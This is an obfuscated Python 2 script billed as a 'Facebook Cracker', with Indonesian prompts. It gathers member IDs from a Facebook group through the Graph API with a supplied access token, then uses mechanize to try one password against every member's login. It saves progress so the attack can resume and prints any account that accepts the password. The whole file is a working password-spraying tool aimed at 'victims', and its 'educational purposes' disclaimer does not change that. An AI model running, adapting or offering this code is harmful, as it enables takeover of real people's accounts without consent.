#!usr/bin/python
#Facebook Cracker Version 2 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
#This program is for educational purposes only.
#Don't attack people facebook accounts it's illegal ! 
#If you want to crack into someone's account, you must have the permission of the user. 
#InfosecHacker is not responsible.
if 64 - 64: i11iIiiIii
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
import sys , os
o0OO00 = os . path . dirname ( os . path . realpath ( __file__ ) ) + '/'
sys . path . append ( o0OO00 + 'modul' )
import random
import mechanize
import cookielib
import json
import urllib
if 78 - 78: i11i . oOooOoO0Oo0O
if 10 - 10: IIiI1I11i11
ooOO00oOo = ''
OOOo0 = ooOO00oOo + '\033[0m'
Oooo000o = ooOO00oOo + '\033[31m'
IiIi11iIIi1Ii = ooOO00oOo + '\033[32m'
Oo0O = ooOO00oOo + '\033[33m'
IiI = ooOO00oOo + '\033[34m'
ooOo = ooOO00oOo + '\033[35m'
Oo = ooOO00oOo + '\033[36m'
o0O = ooOO00oOo + '\033[37m'
if 48 - 48: iII111i % IiII + I1Ii111 / ooOoO0o * o00O0oo
O0oOO0o0 = IiIi11iIIi1Ii + '''
        +=========================================+
        |..........''' + Oo0O + '''Facebook Cracker v 3''' + IiIi11iIIi1Ii + '''...........|
        +-----------------------------------------+
        |''' + Oo + '''#Author: InfoSecHacker''' + IiIi11iIIi1Ii + '''                   |
        |''' + Oo + '''#Contact: www.twitter.com/abhishekmani002''' + IiIi11iIIi1Ii + '''|
        |''' + Oo + '''#Date: 23/10/2015''' + IiIi11iIIi1Ii + '''                        |
        |''' + Oo + '''#This tool is made for pentesting. ''' + IiIi11iIIi1Ii + '''      |
        |''' + Oo + '''#Changing the Description of this tool''' + IiIi11iIIi1Ii + '''   |
        |''' + Oo + '''Won't made you the coder ^_^ !!!''' + IiIi11iIIi1Ii + '''         |
        |''' + Oo + '''#Respect Coderz ^_^           ''' + IiIi11iIIi1Ii + '''           |
        |''' + Oo + '''#I take no responsibilities for the ''' + IiIi11iIIi1Ii + '''     |
        |''' + Oo + ''' use of this program !       ''' + IiIi11iIIi1Ii + '''            |
        +=========================================+
        |..........''' + Oo0O + '''  MOD BY BANG DJON  ''' + IiIi11iIIi1Ii + '''...........|
        +-----------------------------------------+
''' + OOOo0
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"
if 9 - 9: o0o - OOO0o0o
if 40 - 40: II / oo00 * i1I1Ii1iI1ii * o0oOoO00o . i1
if 64 - 64: ooOoO0o % iII111i
if 1 - 1: i1I1Ii1iI1ii
def OOooo0000ooo ( ) :
 global data2
 if 79 - 79: o00O0oo + o0oOoO00o . i1 * i1I1Ii1iI1ii % OOO0o0o . oOooOoO0Oo0O
 try :
  ii11 = raw_input('masukkan AccessToken kamu = ')
 except : print '[*] pengambilan access_token gagal' ; sys . exit ( )
 if 28 - 28: i1 + o0oOoO00o - i1 . OoooooooOO
 oO0 = raw_input ( 'masukkan id group = ' )
 all = [ ]
 IIIi1i1I = input ( 'mau berapa akun,,? ' ) - 1
 if 72 - 72: IIiI1I11i11 % o0o . oOooOoO0Oo0O / OOO0o0o * oOooOoO0Oo0O
 iiiI11 = 'https://graph.facebook.com/' + oO0 + '/?fields=members&access_token=%s' % ii11
 OOooO = urllib . urlopen ( iiiI11 ) . read ( )
 OOoO00o = json . loads ( OOooO . decode ( 'utf-8' ) )
 next = OOoO00o [ 'members' ] [ 'paging' ] [ 'next' ]
 if 9 - 9: oOooOoO0Oo0O - II % i1IIi % OoooooooOO
 for i1iIIi1 in OOoO00o [ 'members' ] [ 'data' ] :
  if len ( all ) <= IIIi1i1I :
   if i1iIIi1 [ 'id' ] not in all : all . append ( i1iIIi1 [ 'id' ] )
   if 50 - 50: i11iIiiIii - II
   if 78 - 78: iII111i
 Iii1I111 = next
 OO0O0O00OooO = urllib . urlopen ( Iii1I111 ) . read ( )
 data2 = json . loads ( OO0O0O00OooO . decode ( 'utf-8' ) )
 OoooooOoo = data2 [ 'paging' ] [ 'next' ]
 for i1iIIi1 in data2 [ 'data' ] :
  if len ( all ) <= IIIi1i1I :
   if i1iIIi1 [ 'id' ] not in all : all . append ( i1iIIi1 [ 'id' ] )
   if 70 - 70: iII111i . iII111i - iII111i / ooOoO0o * o0o
   if 86 - 86: i11iIiiIii + II + i1 * OOO0o0o + I1Ii111
 if 'next' in data2 [ 'paging' ] : print 'wait......'
 while 'next' in data2 [ 'paging' ] :
  if len ( all ) <= IIIi1i1I :
   Iii1I111 = data2 [ 'paging' ] [ 'next' ]
   OO0O0O00OooO = urllib . urlopen ( Iii1I111 ) . read ( )
   data2 = json . loads ( OO0O0O00OooO . decode ( 'utf-8' ) )
   for i1iIIi1 in data2 [ 'data' ] :
    if len ( all ) <= IIIi1i1I :
     if i1iIIi1 [ 'id' ] not in all : all . append ( i1iIIi1 [ 'id' ] )
  else :
   Iii1I111 = ''
   OO0O0O00OooO = ''
   data2 = { 'paging' : '' }
 return all
 if 61 - 61: iII111i / i11iIiiIii
 if 34 - 34: OoooooooOO + iIii1I11I1II1 + i11iIiiIii - ooOoO0o + i11iIiiIii
try :
 ooOoo0O = open ( o0OO00 + 'fb.dat' ) . readlines ( )
 OooO0 = II11iiii1Ii = eval ( ooOoo0O [ 0 ] . replace ( '\n' , '' ) )
 OO0o = Ooo = ooOoo0O [ 1 ] . replace ( '\n' , '' )
 O0o0Oo = ooOoo0O [ 2 ] . replace ( '\n' , '' )
except :
 OooO0 = II11iiii1Ii = OOooo0000ooo ( )
 OO0o = Ooo = str ( raw_input ( "Masukkan password = " ) )
 O0o0Oo = 1
 try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( O0o0Oo ) )
 except : print ( 'tidak bisa menyimpan data, penyerangan akan selalu dimulai dari awal' )
 if 78 - 78: iIii1I11I1II1 - II * iII111i + I1Ii111 + oo00 + oo00
 if 11 - 11: oo00 - iII111i % i1 % oo00 / IiII - iII111i
 if 74 - 74: oo00 * O0
 if 89 - 89: o00O0oo + IIiI1I11i11
 if 3 - 3: i1IIi / oOooOoO0Oo0O % OOO0o0o * i11iIiiIii / O0 * OOO0o0o
 if 49 - 49: o00O0oo % II + i1IIi . oOooOoO0Oo0O % ooOoO0o
print Oo0O + '_____eemail_____=' + str ( II11iiii1Ii ) + '\n' + '____password____=' + Ooo + OOOo0
if 48 - 48: OOO0o0o + OOO0o0o / i11i / iIii1I11I1II1
i1iiI11I = [ ( 'User-agent' , 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
if 29 - 29: OoooooooOO
iI = 'facebook.com/'
I1i1I1II = 'facebook.com/login.php?login_attempt=1&lwv=110'
i1IiIiiI = 'facebook.com/'
I1I = 'facebook.com/recover/initiate?cl=1'
if 80 - 80: IiII - iII111i
OOO00 = 1
iiiiiIIii = 0
O000OO0 = ''
if 43 - 43: o0oOoO00o - O0 % oOooOoO0Oo0O . OOO0o0o
def o00 ( emails ) :
 global iiiiiIIii , OOO00 , O0o0Oo , O000OO0 , OO0o
 try :
  if OOO00 == int ( O0o0Oo ) : iiiiiIIii = 1
  if iiiiiIIii == 1 :
   sys . stdout . write ( "\r" + OOOo0 + "[*]" + Oo + " mencoba id ke " + Oo0O + "%s %s.. " % ( OOO00 , emails ) + OOOo0 )
   sys . stdout . flush ( )
   br . addheaders = [ ( 'User-agent' , random . choice ( i1iiI11I ) ) ]
   OooOooo = br . open ( 'https://www.' + iI )
   br . select_form ( nr = 0 )
   if 97 - 97: i1 - o0o * i11iIiiIii / IiII % o0oOoO00o - OoooooooOO
   if 59 - 59: O0 + oOooOoO0Oo0O + i1I1Ii1iI1ii % oOooOoO0Oo0O
   br . form [ 'email' ] = emails
   br . form [ 'pass' ] = OO0o
   br . submit ( )
   O000OO0 = br . geturl ( )
   O000OO0 = O000OO0 . replace ( 'https://www.' , '' ) . replace ( 'https://web.' , '' )
   if O000OO0 != I1i1I1II and O000OO0 != I1I and O000OO0 != 'facebook.com/login.php?login_attempt=1&lwv=111' :
    print O000OO0
   if O000OO0 == iI or O000OO0 == i1IiIiiI :
    print "\n\n\n [*] Password found .. !!"
    print "\n [*] Password : %s\n" % ( OO0o )
    sys . exit ( 1 )
 except KeyboardInterrupt :
  print "\n[*] Exiting program .. "
  try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( OOO00 ) )
  except : pass
  sys . exit ( 1 )
 except :
  import traceback
  o0OOoo0OO0OOO = traceback . format_exception
  iI1iI1I1i1I = sys . exc_info
  print '\n' + str ( iI1iI1I1i1I ( ) [ 1 ] )
  print ( u'\nPlease contact me Bang-Djon' )
  if 24 - 24: ooOoO0o
  if O000OO0 == iI or O000OO0 == i1IiIiiI :
   try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( OOO00 ) )
   except : pass
  else :
   try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( OOO00 ) )
   except : pass
   print "\n[*] exiting....... "
  sys . exit ( 1 )
  if 56 - 56: i1
def o0OO00oO ( ) :
 global emails , OOO00
 for emails in OooO0 :
  o00 ( emails )
  OOO00 += 1
  if 39 - 39: i1I1Ii1iI1ii - i11i * iII111i % I1Ii111 * i11i % i11i
  if 59 - 59: iIii1I11I1II1 + oOooOoO0Oo0O - I1Ii111 - oOooOoO0Oo0O + o0o / ooOoO0o
  if 24 - 24: OOO0o0o . oo00 % o0o + i1 % IiII
def I11III1II ( ) :
 if 16 - 16: oOooOoO0Oo0O * o00O0oo % i1I1Ii1iI1ii
 global br , OO0o
 try :
  br = mechanize . Browser ( )
  Oo000o = cookielib . LWPCookieJar ( )
  br . set_handle_robots ( False )
  br . set_handle_equiv ( True )
  br . set_handle_referer ( True )
  br . set_handle_redirect ( True )
  br . set_cookiejar ( Oo000o )
  br . set_handle_refresh ( mechanize . _http . HTTPRefreshProcessor ( ) , max_time = 1 )
 except KeyboardInterrupt :
  print "\n[*] Exiting program ..\n"
  try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( OOO00 ) )
  except : pass
  sys . exit ( 1 )
 except :
  print "\n[*] Koneksi Habis .. "
  try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( OOO00 ) )
  except : pass
  sys . exit ( 1 )
 try :
  print O0oOO0o0
  print OOOo0 + " [*]" + Oo + " Password to crack :" + Oo0O + " %s" % ( OO0o ) + OOOo0
  if 7 - 7: i1 * iII111i % o00O0oo . i1I1Ii1iI1ii
  print OOOo0 + " [*]" + Oo + " Cracking, please wait ..." + OOOo0
 except KeyboardInterrupt :
  print "\n [*] Exiting program ..\n"
  try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( OOO00 ) )
  except : pass
  sys . exit ( 1 )
 except :
  print "\n[*] Koneksi Habis .. "
  try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( OOO00 ) )
  except : pass
  sys . exit ( 1 )
 try :
  o0OO00oO ( )
  if 45 - 45: i11iIiiIii * i11i % iIii1I11I1II1 + ooOoO0o - II
  if 17 - 17: i1I1Ii1iI1ii
 except KeyboardInterrupt :
  print "\n [*] Exiting program ..\n"
  try : open ( o0OO00 + 'fb.dat' , 'w' ) . write ( str ( II11iiii1Ii ) + '\n' + Ooo + '\n' + str ( OOO00 ) )
  except : pass
  sys . exit ( 1 )
  if 62 - 62: iIii1I11I1II1 * IiII
if __name__ == '__main__' :
 I11III1II ( ) 